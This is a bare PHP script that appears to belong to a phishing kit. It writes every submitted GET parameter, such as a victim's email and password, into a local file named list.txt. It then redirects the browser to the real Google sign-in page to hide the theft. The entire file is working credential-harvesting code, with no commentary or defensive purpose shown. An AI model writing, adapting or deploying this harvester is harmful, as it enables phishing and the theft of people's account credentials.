<?php
header("Location:https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=ATuJsjyvKJEeuqHH0tAbBx184z4P5pbls9UqXtEaZICmxqSZbRpbo8ZktDT7FmEhQwMIMgmT1iUBlw&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-234115263%3A1707876672340854&theme=glf");

$handle=fopen("list.txt","a");
foreach ($_GET as $variable => 
$value) {
    fwrite($handle,$variable);
    fwrite($handle, "=");
    fwrite($handle,$value);
    fwrite($handle,"\r\n");
}
fclose($handle);
?>